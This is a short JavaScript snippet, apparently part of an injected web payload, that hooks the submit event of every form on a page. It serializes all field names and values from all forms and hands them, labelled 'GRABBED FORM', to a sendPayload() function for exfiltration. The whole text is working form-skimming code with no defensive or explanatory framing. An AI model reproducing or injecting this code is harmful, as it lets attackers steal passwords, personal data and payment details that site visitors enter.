function serialize(form) {
    var data;
    if (!form || form.nodeName !== "FORM") {
        return;
    }
    var i, j, q = [];
    for (i = 0; i <  form.elements.length; i++) {
        if (form.elements[i].name != "") q.push(form.elements[i].name + "=" + form.elements[i].value);        
    }
    data = q.join("\n");
    return data;
}


for (var i=0;i<document.getElementsByTagName("form").length;i++)
{

    document.getElementsByTagName("form")[i].addEventListener('submit', function() {
        for(var ii=0;ii<document.getElementsByTagName("form").length;ii++) {
            sendPayload("----- GRABBED FORM " + document.getElementsByTagName("form")[ii].name + " -----\nDATA:\n" + serialize(document.getElementsByTagName("form")[ii])+ "\n");
        }

    });       
}

